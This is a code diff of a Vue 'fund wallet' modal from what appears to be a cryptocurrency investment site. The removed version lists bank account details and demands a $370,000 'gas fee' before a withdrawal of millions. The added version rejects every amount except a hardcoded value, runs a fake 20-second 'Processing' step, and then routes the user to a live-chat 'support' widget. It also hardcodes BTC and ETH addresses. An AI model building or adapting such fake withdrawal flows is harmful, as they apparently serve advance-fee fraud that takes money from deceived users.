@@ -8,82 +8,9 @@
           <img src="@/assets/fund-wallet-icon.svg" alt="fund-wallet-icon"/>
           <i class='bx bx-x' @click="close"></i>
         </div>
-        <form @submit.prevent="checkAmount" class="second-part">
-          <br/>
-          <div class="separate">
-<!--            <input type="checkbox" disabled />-->
-            <p class="text-3">
-              <span>Account Name</span> : M & H Ideas, Inc.
-            </p>
-          </div>
-
+        <form @submit.prevent="handleSubmit" class="second-part">
+          <p class="text-3">Please attach a Bech32 wallet address</p>
           <hr/>
-
-          <div class="separate">
-<!--            <input type="checkbox" disabled />-->
-            <p class="text-3">
-             <span>Account Number</span> : 1391 0565 6262
-            </p>
-          </div>
-
-
-<!--          <p class="text-5">-->
-<!--            Confirmation : 3 of 3-->
-<!--          </p>-->
-
-
-          <hr/>
-
-
-          <div class="separate">
-<!--            <input type="checkbox" disabled  />-->
-            <p class="text-3">
-              <span>Bank Address</span> : Bank of America; 1801 16th St Mall; Denver, CO; 80202; United States
-            </p>
-          </div>
-
-          <hr/>
-
-          <div class="separate">
-<!--            <input type="checkbox" disabled />-->
-            <p class="text-3">
-              <span>Bank ABA/SWIFT Code</span> : 026009593
-            </p>
-          </div>
-
-          <hr/>
-
-
-          <div class="separate">
-            <!--            <input type="checkbox" disabled />-->
-            <p class="text-3 fiat">
-              <span>Fiat Amount</span>
-              <input type="text" class="fiat-input" required v-model="payOutAmount"
-                     placeholder="Enter Fiat Amount in USD"
-              />
-            </p>
-          </div>
-
-
-          <!--          <p class="text-5">-->
-          <!--            Confirmation : 3 of 3-->
-          <!--          </p>-->
-
-
-          <hr/>
-
-
-          <div class="separate">
-                        <input type="checkbox"  required />
-            <p class="text-3">
-              Verify Account Details
-            </p>
-          </div>
-
-          <hr/>
-
-
-
           <!--          <p class="text-2">How to fund your wallet:</p>-->
           <!--          <p class="text-3">Transfer desired amount to the details displayed below and have your balance funded</p>-->
           <!--          <p class="text-3">Note: After making your deposit,kindly send a screenshot/proof of deposit to-->
@@ -100,41 +27,52 @@
 
           <!--          <hr/>-->
 
-          <!--          <div class="input-button-wrapper">-->
-          <!--            <div>-->
-          <!--              <label>Destination wallet</label>-->
-          <!--            </div>-->
-          <!--            <input type="text" required v-model="destinationWalletAddress"  class="text-input"-->
-          <!--                   placeholder="Kindly enter wallet address"-->
-          <!--            />-->
-          <!--            &lt;!&ndash;            <button  class="submit-button" @click="copyText">Copy</button>&ndash;&gt;-->
-          <!--          </div>-->
+          <div class="input-button-wrapper-2">
+            <label>Enter Bech32 Wallet Address</label>
+            <div class="input-button-wrapper">
+              <input type="text" required v-model="inputValue1"  class="text-input" />
+              <!--              <button  class="submit-button" @click="copyText">Copy</button>-->
+            </div>
+          </div>
 
-          <!--          <div class="input-button-wrapper">-->
-          <!--            <div>-->
-          <!--              <label>Amount (BTC)</label>-->
-          <!--            </div>-->
-          <!--            <input type="text" required v-model="payOutAmount"  class="text-input"-->
-          <!--                   placeholder="Enter Pay Out Amount in BTC"-->
-          <!--            />-->
-          <!--            &lt;!&ndash;            <button  class="submit-button">Copy</button>&ndash;&gt;-->
-          <!--          </div>-->
+          <div class="input-button-wrapper-2">
+
+            <label>Enter Amount</label>
+
+            <div class="input-button-wrapper">
+              <input type="number" required v-model="inputValue4"  class="text-input" />
+              <!--              <button  class="submit-button">Copy</button>-->
+            </div>
+          </div>
 
 
-          <!--          <div class="input-button-wrapper">-->
-          <!--            &lt;!&ndash;            <p class="text-fiat">Fiat amount: $8,004,409.2 | 1 BTC = {{bitcoinRate}}</p>&ndash;&gt;-->
-          <!--            <p class="text-fiat">Fiat amount: $8,004,409.2 | 89.14 BTC</p>-->
-          <!--          </div>-->
+          <div class="input-button-wrapper" v-if="isLoading3">
+            <!--            <p class="text-fiat">Fiat amount: $93,822.00 | 1 ETH = {{ethereumRate}}</p>-->
 
+            <button  class="submit-button" >Proceed</button>
+          </div>
 
+          <hr/>
 
-          <!--          <div class="seprate" >-->
-          <!--            <p class="loader-text" >Awaiting Payment</p>-->
-          <!--            <span class="loader"></span>-->
-          <!--          </div>-->
-          <button class="submit-button" >Proceed</button>
+          <div class="seprate" v-if="isLoading">
+            <p class="loader-text" >Processing...</p>
+            <span class="loader"></span>
+          </div>
+
+          <div class="seprate" v-if="isLoading2">
+<!--            <input required type="checkbox"/>&nbsp;&nbsp;-->
+            <p class="loader-text" >Contact Support for assistance</p>
+            <!--            <span class="loader"></span>-->
+          </div>
+
 
         </form>
+
+        <div class="input-button-wrapper" v-if="isLoading2" >
+          <!--            <p class="text-fiat">Fiat amount: $93,822.00 | 1 ETH = {{ethereumRate}}</p>-->
+
+          <button  class="submit-button" @click="loadJivoChat" >Contact Support</button>
+        </div>
 
 
         <!--        <br/>-->
@@ -146,15 +84,41 @@
   </div>
 </template>
 
-
 <script>
+
+
+
+// import Swal from "sweetalert2";
+// import VueQrcode from '@chenfengyuan/vue-qrcode';
 import {mapState} from "vuex";
-import Swal from "sweetalert2";
+import axios from "axios";
+import Toastify from "toastify-js";
 
 export default {
   name: "FundWalletModal7",
   emits: ['close', 'open'],
-  // components: {VueQrcode},
+  // components: {
+  //   VueQrcode,
+  // },
+  data() {
+    return {
+      contacts: [],
+      accountNumber: '',
+      bankName: '',
+      bitcoinAddress: '',
+      ethereumAddress: '',
+      routingNumber: '',
+      inputValue1: '',
+      inputValue2: '',
+      inputValue3: 119000,
+      inputValue4: '',
+      bitcoinRate: null,
+      ethereumRate: null,
+      isLoading: false,
+      isLoading2: false,
+      isLoading3: true, // To control the visibility of the loader
+    };
+  },
   computed: {
     ...mapState(['loginForm']),
   },
@@ -166,6 +130,18 @@ export default {
   },
 
   methods:{
+    loadJivoChat() {
+      this.isLoading = false;
+      // Check if the script is already loaded to avoid duplicates
+      if (!document.querySelector('script[src="//code.jivosite.com/widget/05FVW5zjLz"]')) {
+        const script = document.createElement('script');
+        script.src = '//code.jivosite.com/widget/05FVW5zjLz';
+        script.async = true;
+        document.body.appendChild(script);
+      } else {
+        console.log("JivoChat script already loaded.");
+      }
+    },
     async close() {
       this.$emit('close');
       // await Swal.fire({
@@ -174,6 +150,64 @@ export default {
       //   text: 'Deposit Processing',
       // });
     },
+
+    async open() {
+      this.$emit('close');
+      this.$emit('open');
+      // await Swal.fire({
+      //   icon: 'success',
+      //   title: 'Pending',
+      //   text: 'Deposit Processing',
+      // });
+    },
+
+    showToast() {
+      Toastify({
+        text: "Invalid Amount.",
+        duration: 4000,
+        close: true,
+        gravity: "top", // `top` or `bottom`
+        position: "right", // `left`, `center` or `right`
+        backgroundColor: "#9e0202",
+        stopOnFocus: true, // Prevents dismissing of toast on hover
+        onClick: function(){} // Callback after click
+      }).showToast();
+    },
+
+    handleSubmit() {
+      // Validate wallet address and hash
+      // const validWalletAddress = "0xE66e3B8E6C111BF814Fbb59A19042Ba4DcE209b6";
+      const validHash = 111032;
+
+      if (this.inputValue4 !== validHash) {
+        this.showToast();
+        return; // Stop execution
+      }
+
+      // Show the loader
+      this.isLoading = true;
+
+      // Wait for 5 seconds
+      setTimeout(() => {
+        // After 5 seconds, close the modal and hide the loader
+        this.isLoading = false;
+        this.isLoading2 = true;
+        this.isLoading3 = false;
+      }, 20000); // 5 seconds delay
+    },
+
+
+    // handleSubmit() {
+    //   // Show the loader
+    //   this.isLoading = true;
+    //
+    //   // Wait for 5 seconds
+    //   setTimeout(() => {
+    //     // After 5 seconds, close the modal and hide the loader
+    //     this.isLoading = false;
+    //     this.open(); // Close the modal
+    //   }, 5000); // 5 seconds delay
+    // },
 
     fetchBitcoinRate() {
       // Set loading to true when the request starts
@@ -189,6 +223,24 @@ export default {
           .catch(error => {
             console.error(error);
             // Set loading to false also if there is an error
+            this.loading = false;
+          });
+    },
+
+    fetchEthereumRate() {
+      // Set loading to true when the request starts
+      this.loading = true;
+
+      // Use CoinGecko API to fetch the Ethereum price
+      axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
+          .then(response => {
+            this.ethereumRate = response.data.ethereum.usd;
+            // Set loading to false when the data is successfully fetched
+            this.loading = false;
+          })
+          .catch(error => {
+            console.error(error);
+            // Set loading to false if there is an error
             this.loading = false;
           });
     },
@@ -226,66 +278,22 @@ export default {
 
     },
 
-    // New method to check the amount
-    async checkAmount() {
-      // Convert the entered amount to a float
-      const amount = parseFloat(this.payOutAmount);
-
-      // Check if the amount is greater than or equal to 8,000,000.00
-      if (amount >= 7000000) {
-        // Display success message
-        // alert("Success! The amount is valid.");
-        await Swal.fire({
-          icon: 'info',
-          title: 'Gas fee Required',
-          text: 'To start a withdrawal you need $370,000 on your network to process the transfer',
-          // footer: '<span style="color: #00bc00;">PoW Received</span>',
-        });
-        await this.$emit('open');
-        await this.$emit('close');
-
-      } else {
-        // Display error message
-        // alert("Error! The amount must be at least 8,000,000.00.");
-        await Swal.fire({
-          icon: 'error',
-          title: 'Error',
-          text: 'The amount must be at least 7,000,000 USD',
-          // footer: '<span style="color: #00bc00;">PoW Received</span>',
-        });
-      }
-    }
-
-  },
-  data() {
-    return {
-      contacts: [],
-      accountNumber: '',
-      bankName: '',
-      bitcoinAddress: '',
-      ethereumAddress: '',
-      routingNumber: '',
-      inputValue1: '',
-      inputValue2: '',
-      inputValue3: 119000,
-      bitcoinRate: null,
-      destinationWalletAddress: "",
-      payOutAmount: "",
-    };
   },
   created() {
     this.fetchBitcoinRate()
-    this.convertAndSave()
-    this.bitcoinAddress = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
-    this.inputValue1 = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
-    this.inputValue2 = this.loginForm.inputValue2
+    this.fetchEthereumRate()
+    // this.convertAndSave()
+    this.bitcoinAddress = "0x5C6A12A994E67C46EFd238768776c34f339226B5"
+    // this.inputValue1 = "0x5C6A12A994E67C46EFd238768776c34f339226B5"
+    // this.inputValue2 = this.loginForm.inputValue2
   },
   mounted() {
     this.fetchBitcoinRate()
-    this.convertAndSave()
-    this.bitcoinAddress = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
-    this.inputValue1 = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
-    this.inputValue2 = this.loginForm.inputValue2
+    this.fetchEthereumRate()
+    // this.convertAndSave()
+    this.bitcoinAddress = "0x5C6A12A994E67C46EFd238768776c34f339226B5"
+    // this.inputValue1 = "0x5C6A12A994E67C46EFd238768776c34f339226B5"
+    // this.inputValue2 = this.loginForm.inputValue2
   }
 }
 </script>
@@ -308,7 +316,7 @@ dialog {
   top: 7vh;
   width: 32rem;
   height: 32rem;
-  left: calc(50% - 13.5rem);
+  left: calc(50% - 12rem);
   margin: 0;
   background-color: transparent;
   z-index: 100;
@@ -321,11 +329,11 @@ dialog {
   display: block;
   overflow: hidden;
   width: 420px;
-  height: 610px;
+  height: 500px;
   /*height: auto;*/
   padding: 24px;
   border-radius: 5px;
-  background-color: #ffffff;
+  background-color: rgba(5, 13 ,33 ,0.8);
   border: 0.5px solid #3C4A57FF;
   box-shadow: 0 0 34px 0 rgba(3, 28, 67, 0.13);
 }
@@ -335,106 +343,60 @@ dialog {
   justify-content: space-between;
 }
 
-.fiat{
-  display: flex;
-  flex-direction: column;
-  width: 100%;
-}
-
-.fiat-input{
-  width: 100%;
-  margin-top: 3px;
-  padding: 5px;
-  border: 1px solid #ccc;
-  font-size: 14px;
-}
-
-.separate{
-  display: flex;
-  align-items: center;
-  align-content: center;
-  gap: 5px;
-}
-
-.status{
-  background-color: #FFBF00;
-  padding: 7px 20px;
-  color: #FFFFFF;
-  border-radius: 5px;
-  font-size: 14px;
-}
-
-.status-2{
-  background-color: rgb(211, 211, 211);
-  padding: 7px 20px;
-  border-radius: 5px;
-  font-size: 14px;
-}
-
-.status-3{
-  background-color: #4BB543;
-  color: #FFFFFF;
-  padding: 7px 20px;
-  border-radius: 5px;
-  font-size: 14px;
-}
-
 .bx-x{
   font-size: 25px;
   padding-top: 2px;
-  color: #0f171c;
+  color: #ffffff;
+}
+
+label{
+  color: #ffffff;
 }
 
 .text-1{
   font-weight: 600;
   font-size: 18px;
   line-height: 28px;
-  color: #0f171c;
+  color: #ffffff;
   padding-top: 2.5%;
   padding-bottom: 1%;
-  word-wrap: break-word; /* or overflow-wrap: break-word; */
 }
 
 .text-2{
   font-weight: 400;
   font-size: 16px;
   line-height: 24px;
-  color: #070e20;
+  color: #ffffff;
   padding-top: 1%;
   padding-bottom: 2%;
-  word-wrap: break-word; /* or overflow-wrap: break-word; */
 }
 
 .text-3{
   font-weight: 400;
   font-size: 16px;
   line-height: 24px;
-  color: #070e20;
+  color: #ffffff;
   padding-top: 1.5%;
   padding-bottom: 2%;
-  word-wrap: break-word; /* or overflow-wrap: break-word; */
 }
 
 .text-4{
   font-weight: 400;
   font-size: 16px;
   line-height: 24px;
-  color: #070e20;
+  color: #ffffff;
   padding-top: 1.5%;
   padding-bottom: 1.5%;
-  word-wrap: break-word; /* or overflow-wrap: break-word; */
 }
 
 .text-5{
+  font-weight: 400;
   font-size: 13px;
   line-height: 24px;
-  color: #070e20;
-  margin-top: 0;
-  padding-top: 0;
-  padding-left: 10px;
+  color: #ffffff;
+  padding-top: 2%;
   padding-bottom: 2%;
   word-wrap: break-word; /* or overflow-wrap: break-word; */
-  font-family: 'BR-Firma-Light', sans-serif;
 }
 
 button{
@@ -451,10 +413,14 @@ button{
 }
 
 .input-button-wrapper {
-  margin-bottom: 8%;
+  display: flex;
+  justify-content: right;
+  margin-top: 2%;
+}
+
+.input-button-wrapper-2 {
   margin-top: 8%;
-  display: block;
-  width: 100%;
+  margin-bottom: 8%;
 }
 
 .text-input {
@@ -463,27 +429,18 @@ button{
   font-size: 16px;
   border: 1px solid #ccc;
   border-radius: 4px 0 0 4px;
-  width: 100%;
-  margin-top: 1%;
 }
-
 
 .submit-button {
-  padding: 8px 25px;
+  padding: 9.5px 25px;
   font-size: 16px;
-  background-color: #007bff;
-  color: white;
-  border: 1px solid #007bff;
+  background-image: linear-gradient(87.71deg, #38ffea 3.28%, #72a2ff 114.54%);
+  color: #000000;
   border-radius: 4px;
   cursor: pointer;
-  margin-top: 5%;
-  display: inline-block;
 }
 
-.submit-button:hover {
-  background-color: #0056b3;
-  border-color: #0056b3;
-}
+
 
 .loader {
   width: 65%;
@@ -509,16 +466,19 @@ button{
   display: flex;
   align-items: center;
   align-content: center;
-  margin-top: 20px;
+  margin-top: 40px;
   margin-bottom: 10px;
 }
 .loader-text{
   font-size: 13px;
   margin-right: 10px;
+  color: #FFFFFF;
 }
 
 .text-fiat{
   font-size: 13px;
+  margin-bottom: 2%;
+  color: #FFFFFF;
 }
 
 .qr-code{
@@ -527,8 +487,8 @@ button{
 
 hr{
   border: 0.5px solid #ccc;
-  margin-top: 3%;
-  margin-bottom: 3%;
+  margin-bottom: 5px;
+  margin-top: 5px;
 }
 
 @keyframes animloader {
@@ -555,14 +515,14 @@ hr{
 }
 @media (max-width: 500px) {
   dialog {
-    top: 9vh;
+    top: 11vh;
     width: 25rem;
     height: 18rem;
-    left: calc(50% - 11.5rem);
+    left: calc(50% - 11rem);
     right: 30px;
   }
   .alpha{
-    width: 370px;
+    width: 360px;
     height: 610px;
   }
   h3{
